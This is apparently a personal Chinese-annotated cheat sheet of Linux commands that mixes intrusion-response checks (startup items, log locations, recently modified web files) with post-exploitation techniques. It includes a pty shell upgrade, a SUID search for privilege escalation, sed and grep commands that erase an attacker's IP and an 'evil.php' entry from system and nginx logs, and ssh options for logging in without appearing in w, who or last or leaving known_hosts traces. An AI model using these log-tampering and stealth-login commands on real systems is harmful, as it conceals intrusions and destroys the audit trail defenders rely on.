import pty; 
pty.spawn("/bin/bash")

find / -perm -u=s -type f 2>/dev/null

diff -urNA webdir webdir_bak

可以通过如下代码，查看相关配置文件安装路径

dpkg -L gitweb

diff -urNA webdir webdir_bak

find /var/www/html -mtime +0 "*.jsp"       搜索web目录下24小时内被修改的jsp文件

 启动项排查

cat /etc/rc.local            排查rc.local文件中添加的启动项命令
ls /etc/init.d               排查init.d目录下添加的自启动脚本
ls /etc/profile.d            排查profile.d目录下添加的自启动脚本
chkconfig --list             centos系统列出自启动项

/var/log/btmp   记录所有登录失败信息，使用lastb命令查看
/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看
/var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看
/var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看
/var/log/secure   记录与安全相关的日志信息
/var/log/message  记录系统启动后的信息和错误日志

sed  -i '/自己的ip/'d  /var/log/messages

# 全局替换登录IP地址：
sed -i 's/192.168.166.85/192.168.1.1/g' secure

# 使用grep -v来把我们的相关信息删除,
cat /var/log/nginx/access.log | grep -v evil.php > tmp.log

# 把修改过的日志覆盖到原日志文件
cat tmp.log > /var/log/nginx/access.log/

隐身登录系统，不会被 w、who、last 等指令检测到。

ssh -T root@192.168.0.1 /bin/bash -i

不记录 ssh 公钥在本地.ssh 目录中

ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i

